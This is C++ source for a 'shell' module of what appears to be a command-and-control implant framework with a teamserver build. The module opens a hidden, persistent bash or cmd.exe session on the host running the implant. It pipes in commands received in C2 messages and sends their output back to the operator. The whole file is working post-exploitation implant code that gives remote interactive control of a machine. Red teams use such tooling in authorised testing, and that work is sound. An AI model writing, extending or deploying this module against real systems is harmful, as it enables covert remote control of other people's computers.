#include "Shell.hpp"
#include "Common.hpp"

#include <cstring>
#ifdef __linux__
#include <pty.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/wait.h>
#elif _WIN32
#include <windows.h>
#endif
#include <chrono>

using namespace std;

constexpr std::string_view moduleName = "shell";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) Shell* ShellConstructor()
{
    return new Shell();
}
#else
__attribute__((visibility("default"))) Shell* ShellConstructor()
{
    return new Shell();
}
#endif

Shell::Shell()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
#ifdef _WIN32
    ZeroMemory(&m_pi, sizeof(m_pi));
    m_hChildStdoutRd = NULL;
    m_hChildStdinWr = NULL;
    m_program = "cmd.exe /Q /K";
#else
    m_masterFd = -1;
    m_pid = -1;
    m_program = "/bin/bash";
#endif
    m_started = false;
}

Shell::~Shell()
{
    stopShell();
}

std::string Shell::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "shell:\n";
    info += "Launch an interactive bash shell that persists across commands.\n";
    info += "Examples:\n";
    info += " - shell            # start shell\n";
    info += " - shell ls -la     # run command\n";
    info += " - shell exit       # stop shell\n";
#endif
    return info;
}

int Shell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::string arg;
    if(splitedCmd.size() > 1)
    {
        for(size_t i = 1; i < splitedCmd.size(); ++i)
        {
            arg += splitedCmd[i];
            if(i + 1 < splitedCmd.size())
                arg += " ";
        }
    }
    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(arg);
#endif
    return 0;
}

int Shell::followUp(const C2Message &c2RetMessage)
{
    return 0;
}

int Shell::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
{
    return 0;
}

int Shell::startShell()
{
#ifdef __linux__
    if(m_started)
        return 0;

    pid_t pid = forkpty(&m_masterFd, NULL, NULL, NULL);
    if(pid == -1)
        return 1;

    if(pid == 0)
    {
        execlp(m_program.c_str(), m_program.c_str(), (char*)NULL);
        _exit(1);
    }

    m_pid = pid;
    m_started = true;
    return 0;
#elif _WIN32
    if(m_started)
        return 0;

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE outRd = NULL, outWr = NULL;
    HANDLE inRd = NULL, inWr = NULL;

    if(!CreatePipe(&outRd, &outWr, &saAttr, 0))
        return 1;
    if(!SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0))
        return 1;
    if(!CreatePipe(&inRd, &inWr, &saAttr, 0))
        return 1;
    if(!SetHandleInformation(inWr, HANDLE_FLAG_INHERIT, 0))
        return 1;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = outWr;
    si.hStdOutput = outWr;
    si.hStdInput = inRd;
    si.dwFlags |= STARTF_USESTDHANDLES;

    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessA(NULL, const_cast<LPSTR>(m_program.c_str()), NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(outWr);
    CloseHandle(inRd);
    if(!ok)
    {
        CloseHandle(outRd);
        CloseHandle(inWr);
        return 1;
    }

    m_hChildStdoutRd = outRd;
    m_hChildStdinWr = inWr;
    m_pi = pi;
    m_started = true;
    return 0;
#endif
}

void Shell::stopShell()
{
#ifdef __linux__
    if(!m_started)
        return;

    write(m_masterFd, "exit\n", 5);
    int status = 0;
    waitpid(m_pid, &status, 0);
    close(m_masterFd);
    m_masterFd = -1;
    m_pid = -1;
    m_started = false;
#elif _WIN32
    if(!m_started)
        return;

    DWORD written = 0;
    const char* exitCmd = "exit\n";
    WriteFile(m_hChildStdinWr, exitCmd, (DWORD)strlen(exitCmd), &written, NULL);
    WaitForSingleObject(m_pi.hProcess, INFINITE);
    CloseHandle(m_hChildStdinWr);
    CloseHandle(m_hChildStdoutRd);
    CloseHandle(m_pi.hProcess);
    CloseHandle(m_pi.hThread);
    m_hChildStdinWr = NULL;
    m_hChildStdoutRd = NULL;
    ZeroMemory(&m_pi, sizeof(m_pi));
    m_started = false;
#endif
}

int Shell::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    std::string cmd = c2Message.cmd();

#ifdef __linux__
    if(!m_started)
    {
        if(!cmd.empty())
            m_program = cmd;
        if(startShell() != 0)
        {
            c2RetMessage.set_errorCode(1);
            return 0;
        }
        if(cmd.empty())
        {
            c2RetMessage.set_instruction(c2Message.instruction());
            c2RetMessage.set_returnvalue("shell started");
            return 0;
        }
    }

    if(cmd == "exit")
    {
        stopShell();
        c2RetMessage.set_instruction(c2Message.instruction());
        c2RetMessage.set_returnvalue("shell terminated");
        return 0;
    }

    // send command
    if(!cmd.empty())
    {
        write(m_masterFd, cmd.c_str(), cmd.size());
        write(m_masterFd, "\n", 1);
    }

    // read output with timeout
    std::string output;
    fd_set fds;
    struct timeval tv;
    char buffer[512];
    auto end = std::chrono::steady_clock::now() + std::chrono::seconds(5);
    while(std::chrono::steady_clock::now() < end)
    {
        FD_ZERO(&fds);
        FD_SET(m_masterFd, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 200000; // 200ms

        int r = select(m_masterFd+1, &fds, NULL, NULL, &tv);
        if(r > 0 && FD_ISSET(m_masterFd, &fds))
        {
            ssize_t n = read(m_masterFd, buffer, sizeof(buffer));
            if(n > 0)
            {
                output.append(buffer, n);
                end = std::chrono::steady_clock::now() + std::chrono::seconds(2);
            }
            else
            {
                break;
            }
        }
        else if(!output.empty())
        {
            break;
        }
    }

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_returnvalue(output);
#elif _WIN32
    if(!m_started)
    {
        if(!cmd.empty())
            m_program = cmd;
        if(startShell() != 0)
        {
            c2RetMessage.set_errorCode(1);
            return 0;
        }
        if(cmd.empty())
        {
            c2RetMessage.set_instruction(c2Message.instruction());
            c2RetMessage.set_returnvalue("shell started");
            return 0;
        }
    }

    if(cmd == "exit")
    {
        stopShell();
        c2RetMessage.set_instruction(c2Message.instruction());
        c2RetMessage.set_returnvalue("shell terminated");
        return 0;
    }

    if(!cmd.empty())
    {
        DWORD written = 0;
        std::string send = cmd + "\n";
        WriteFile(m_hChildStdinWr, send.c_str(), (DWORD)send.size(), &written, NULL);
    }

    std::string output;
    char buffer[512];
    DWORD bytes = 0;
    auto end = std::chrono::steady_clock::now() + std::chrono::seconds(5);
    while(std::chrono::steady_clock::now() < end)
    {
        DWORD avail = 0;
        if(!PeekNamedPipe(m_hChildStdoutRd, NULL, 0, NULL, &avail, NULL))
            break;
        if(avail)
        {
            if(ReadFile(m_hChildStdoutRd, buffer, min<DWORD>(sizeof(buffer), avail), &bytes, NULL) && bytes > 0)
            {
                output.append(buffer, bytes);
                end = std::chrono::steady_clock::now() + std::chrono::seconds(2);
            }
            else
            {
                break;
            }
        }
        else if(!output.empty())
        {
            break;
        }
        else
        {
            Sleep(100);
        }
    }

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_returnvalue(output);
#endif
    return 0;
}
